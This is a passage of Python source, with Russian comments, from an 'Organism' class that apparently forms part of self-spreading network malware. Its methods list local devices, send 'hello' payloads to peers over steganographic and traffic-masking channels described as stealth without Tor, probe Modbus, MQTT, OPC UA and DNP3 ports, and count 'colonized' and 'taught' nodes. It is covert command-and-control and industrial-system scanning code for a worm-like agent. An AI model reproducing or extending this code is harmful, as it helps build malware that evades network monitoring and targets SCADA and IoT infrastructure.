            self._tr_running = False

    def dump_devices(self):
        """P95e: диагностика - что в local_map."""
        try:
            lm = self.net.local_map
            if not lm:
                return {"error": "no local_map"}
            result = {"type": type(lm).__name__}
            # Пробуем build
            if hasattr(lm, "build"):
                local = lm.build()
                result["build_keys"] = list(local.keys()) if isinstance(local, dict) else str(type(local))
                devices = local.get("devices", []) if isinstance(local, dict) else []
                result["devices_count"] = len(devices)
                if devices:
                    result["device_0_type"] = type(devices[0]).__name__
                    result["device_0_repr"] = repr(devices[0])[:300]
                    result["device_0_keys"] = list(devices[0].keys()) if isinstance(devices[0], dict) else None
            # Свойства
            for attr in ("router_ip", "gateway", "devices", "my_ip", "subnet"):
                if hasattr(lm, attr):
                    v = getattr(lm, attr)
                    if not callable(v):
                        result[attr] = str(v)[:200]
            return result
        except Exception as e:
            import traceback
            return {"error": str(e), "trace": traceback.format_exc()[:500]}

    # =================================================================
    # P96-v2: СКРЫТНОСТЬ (Steganography + Masking + WebRTC + Industrial)
    # БЕЗ I2P/Tor - своя анонимность через стеганографию
    # =================================================================

    def _stego_send(self, ip, payload):
        """P96-v4: через net.send_masked (правильный API)."""
        try:
            # 1. send_masked (маскировка + отправка)
            fn = getattr(self.net, "send_masked", None)
            if fn and callable(fn):
                try:
                    fn(ip, payload)
                    return True
                except TypeError:
                    try:
                        fn(payload, ip)
                        return True
                    except TypeError:
                        pass
                except Exception as e:
                    logger.debug("[Stego] send_masked: %s", e)
            # 2. Fallback: SteganographyEngine
            try:
                if not hasattr(self, "_stego_engine"):
                    from .steganography.engine import SteganographyEngine
                    self._stego_engine = SteganographyEngine()
                for m in ("send_auto", "send_parallel", "send"):
                    mfn = getattr(self._stego_engine, m, None)
                    if mfn and callable(mfn):
                        try:
                            mfn(ip, payload)
                            return True
                        except TypeError:
                            try:
                                mfn(payload, ip)
                                return True
                            except Exception:
                                continue
                        except Exception:
                            continue
            except Exception as e:
                logger.debug("[Stego] engine: %s", e)
        except Exception as e:
            logger.debug("[Stego] %s: %s", ip, e)
        return False

    def _mask_traffic(self):
        """P96-v2: маскировка исходящего трафика под сеть."""
        try:
            masking = getattr(self.net, "_masking_engine", None)
            if not masking:
                return False
            # Применяем адаптацию маскировки
            if hasattr(masking, "adapt"):
                profile = self._get_current_profile()
                masking.adapt(profile)
                return True
            elif hasattr(masking, "mask") and hasattr(self.net, "_ambient_masker"):
                return True
        except Exception as e:
            logger.debug("[Mask] %s", e)
        return False

    def _webrtc_send(self, ip, payload=None):
        """P96-v3-final: WebRTC НЕ подключён в net. Всегда False."""
        return False

    def _industrial_probe(self, ip):
        """P96-v5: быстрый probe (не ждём timeout)."""
        # Быстрая проверка портов
        try:
            import socket
            ports_open = []
            for port in (502, 1883, 4840, 20000):  # modbus, mqtt, opcua, dnp3
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                try:
                    if s.connect_ex((ip, port)) == 0:
                        ports_open.append(port)
                finally:
                    s.close()
            if not ports_open:
                return False  # нет открытых портов - не тратим время
        except Exception:
            return False
        # Если есть открытые - пробуем scan_industrial (но быстро)
        try:
            fn = getattr(self.net, "scan_industrial", None)
            if fn and callable(fn):
                try:
                    fn(ip)
                    return True
                except Exception:
                    pass
        except Exception as e:
            logger.debug("[Industrial] %s: %s", ip, e)
        return False

    def _get_current_profile(self):
        """P96-v2: текущий профиль сети для маскировки."""
        try:
            am = getattr(self.net, "_ambient_masker", None)
            if am and hasattr(am, "get_network_profile"):
                return am.get_network_profile() or {}
            sm = getattr(getattr(self.net, "mycelium", None), "spores", None)
            if sm and hasattr(sm, "get_any_profile"):
                return sm.get_any_profile() or {}
        except Exception:
            pass
        return {}

    def communicate(self, peers):
        """P96-v2: общение через СВОИ каналы (stego/webrtc/industrial).
        
        I2P/Tor НЕ используем - своя анонимность через стеганографию.
        """
        c_stego = c_web = c_ind = 0
        for peer in peers:
            ip = peer.get("ip")
            if not ip:
                continue
            try:
                # 1. Стеганография (DNS/HTTP/ICMP/Timing) - своя анонимность
                if self._stego_send(ip, {"type": "hello", "node_id": self.net.node_id}):
                    c_stego += 1
                # 2. WebRTC (если браузер) - свой P2P
                if self._webrtc_send(ip):
                    c_web += 1
                # 3. Industrial (для IoT/SCADA) - свой IoT
                if peer.get("type") in ("lan_device", "service"):
                    if self._industrial_probe(ip):
                        c_ind += 1
            except Exception as e:
                logger.debug("[Communicate] %s: %s", ip, e)
        
        if c_stego or c_web or c_ind:
            with self._lock:
                self.stats["stego_sent"] = self.stats.get("stego_sent", 0) + c_stego
                self.stats["webrtc_sent"] = self.stats.get("webrtc_sent", 0) + c_web
                self.stats["industrial_probed"] = self.stats.get("industrial_probed", 0) + c_ind
            logger.info("[Communicate] stego=%d webrtc=%d industrial=%d",
                        c_stego, c_web, c_ind)

    def _log_phase(self, phase, elapsed, extra=""):
        entry = {"phase": phase, "elapsed": elapsed, "extra": extra,
                 "ts": time.time(), "cycle": self.stats["cycles"]}
        self._phase_log.append(entry)
        if phase != "wake":
            logger.info("[Organism/%s] %s", phase, extra)
    
    def get_stats(self) -> Dict[str, Any]:
        with self._lock:
            return {
                **self.stats,
                "running": self.running,
                "load": self._load,
                "heartbeat": self.heartbeat,
                "nodes_in_memory": len(self.memory["nodes"]),
                "colonized": len(self.memory["colonized"]),
                "taught": len(self.memory["taught"]),
                "max_depth": self.stats["max_depth"],
            }
    
    def get_phase_log(self, n=20) -> List[Dict[str, Any]]:
        return list(self._phase_log)[-n:]
    
    def __repr__(self):
        return (f"Organism(cycles={self.stats['cycles']}, "
                f"found={self.stats['nodes_found']}, "
                f"colonized={self.stats['nodes_colonized']})")
